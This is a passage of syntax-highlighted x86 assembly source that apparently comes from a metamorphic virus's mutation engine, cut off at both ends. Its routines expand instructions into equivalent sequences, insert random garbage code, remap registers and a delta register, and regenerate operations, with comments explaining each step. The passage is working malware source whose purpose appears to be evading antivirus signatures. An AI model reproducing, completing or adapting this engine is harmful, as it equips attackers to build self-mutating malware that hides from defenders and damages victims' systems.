</span><span class="sc1">;                 jmp   @@Ret</span><span class="sc0">

   </span><span class="sc5">@@Xpand_Next033</span><span class="sc4">:</span><span class="sc0">



   </span><span class="sc5">@@Ret</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">             </span><span class="sc1">; Get a random chance of 1/16</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; If we get it, let's code garbage</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">           </span><span class="sc1">; If the instruction immediately</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OnlyNOP</span><span class="sc0">            </span><span class="sc1">; above is CMP, TEST, CALL Mem or</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">           </span><span class="sc1">; APICALL_STORE, then code only</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OnlyNOP</span><span class="sc0">            </span><span class="sc1">; NOP (FD 90, insert byte 90)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OnlyNOP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OnlyNOP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_InsertGarbage</span><span class="sc0">   </span><span class="sc1">; Insert some garbage</span><span class="sc0">
   </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">@@OnlyNOP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90FDh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Set a NOP</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; Set the new pointer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">XpandThisInstruction</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This function gets the labels at the label table and translates them to</span><span class="sc0">
</span><span class="sc1">;; their new address, using the updated instruction pointers at field +0C on</span><span class="sc0">
</span><span class="sc1">;; the instruction itself. As we can see, the translation is trivial with</span><span class="sc0">
</span><span class="sc1">;; this system.</span><span class="sc0">
</span><span class="sc5">Xpand_UpdateLabels</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LabelTable</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the label table address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the number of labels</span><span class="sc0">

  </span><span class="sc5">@@LoopLabel</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the address of the old instrc.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the pointer to the new one</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set it as the new label pointer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">          </span><span class="sc1">; Next label</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Repeat it for all labels</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopLabel</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xpand_UpdateLabels</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function gets the indexes, translates them to their new register</span><span class="sc0">
</span><span class="sc1">;; equivalent and set them and the addition into their corresponding working</span><span class="sc0">
</span><span class="sc1">;; fields. If a memory address is an identificator of a data variable (09h as</span><span class="sc0">
</span><span class="sc1">;; first index) then the identificator is translated looking at the</span><span class="sc0">
</span><span class="sc1">;; table of variable identificators and set up, completing it with the new</span><span class="sc0">
</span><span class="sc1">;; Delta Register.</span><span class="sc0">
</span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">         </span><span class="sc1">; Is it a variable identificator?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Next_NoIdent</span><span class="sc0">   </span><span class="sc1">; If not, act normally</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the identificator</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the new variable address and</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_DATA_SECTION</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; transform it to an</span><span class="sc0">
                                           </span><span class="sc1">; offset to add to Delta Register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the new Delta</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set Index2 as &lt;no_reg&gt;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">; Return</span><span class="sc0">
     </span><span class="sc5">@@Next_NoIdent</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the first index</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Is there a register?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Next_Index</span><span class="sc0">        </span><span class="sc1">; If not, process next index</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">  </span><span class="sc1">; Translate the register</span><span class="sc0">
     </span><span class="sc5">@@Next_Index</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Save the multiplicator in ECX</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Get the register in EAX</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Next_Index2</span><span class="sc0">       </span><span class="sc1">; If it's not a register, jump</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">; Translate the register and set</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; again the multiplicator</span><span class="sc0">
     </span><span class="sc5">@@Next_Index2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set the 2nd index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Set the dword addition</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">     </span><span class="sc1">; Randomly select if we exchange</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; the index registers</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; The multiplicator is 0?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">            </span><span class="sc1">; If not, don't exchange</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Exchange them if we can</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">                              </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">Xpand_SetMemoryAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Xpand_Set8BitsRegister</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">             </span><span class="sc1">; Set "8 bits" register</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xpand_SetRegister_Common</span><span class="sc0">
</span><span class="sc5">Xpand_Set8BitsRegister</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Xpand_SetRegister</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Set "32 bits" register</span><span class="sc0">
</span><span class="sc5">Xpand_SetRegister_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the number-of-bits flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">; Get the register at +1 in the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0"> </span><span class="sc1">; instruction, translate it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; and set the register</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xpand_SetRegister</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;;;;;</span><span class="sc0">
</span><span class="sc1">;;;; Instruction generation functions</span><span class="sc0">
</span><span class="sc1">;;;;;</span><span class="sc0">

</span><span class="sc1">;; Generate an OP Reg,Imm</span><span class="sc0">
</span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">        </span><span class="sc1">; If 3 (maximum), don't recurse</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0"> </span><span class="sc1">; Select randomly the shape of the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; expansion</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double</span><span class="sc0">

           </span><span class="sc1">;; mov Mem,Reg</span><span class="sc0">
           </span><span class="sc1">;; OP Mem,Imm</span><span class="sc0">
           </span><span class="sc1">;; mov Reg,Mem</span><span class="sc0">
   </span><span class="sc5">@@Triple</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">         </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double</span><span class="sc0">           </span><span class="sc1">; Then make double (flags can be</span><span class="sc0">
                                         </span><span class="sc1">; affected with this type of triplets</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">         </span><span class="sc1">; TEST?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double</span><span class="sc0">           </span><span class="sc1">; The same as with CMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double</span><span class="sc0">           </span><span class="sc1">; Then, the same, to avoid problems</span><span class="sc0">
                                         </span><span class="sc1">; with the shrinking</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0"> </span><span class="sc1">; Save the current op. and values</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">    </span><span class="sc1">; Allocate a temporary variable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set MOV operation (saving</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; the last one)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">       </span><span class="sc1">; Select randomly if we make:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; MOV Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_1</span><span class="sc0">                 </span><span class="sc1">; OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">           </span><span class="sc1">; MOV Reg,Mem</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; or</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; MOV Mem,Imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">           </span><span class="sc1">; OP Mem,Reg</span><span class="sc0">
   </span><span class="sc5">@@Triple_Common</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; MOV Reg,Mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; The only problem that we</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; can have is with the op.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">           </span><span class="sc1">; SUB Reg,Imm, but since we</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0"> </span><span class="sc1">; have substituted</span><span class="sc0">
                                                 </span><span class="sc1">; that operation in the</span><span class="sc0">
   </span><span class="sc5">@@Triple_1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">           </span><span class="sc1">; shrinking by ADD Reg,-Imm,</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; we have no problem with</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; the instruction.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Common</span><span class="sc0">

           </span><span class="sc1">;; MOV Mem,Imm</span><span class="sc0">
           </span><span class="sc1">;; OP Reg,Mem</span><span class="sc0">
   </span><span class="sc5">@@Double</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_MOV</span><span class="sc0">               </span><span class="sc1">; Then make MOV-specific</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">                 </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_CMP</span><span class="sc0">               </span><span class="sc1">; Then, CMP-specific</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; TEST?</span><span class="sc0">
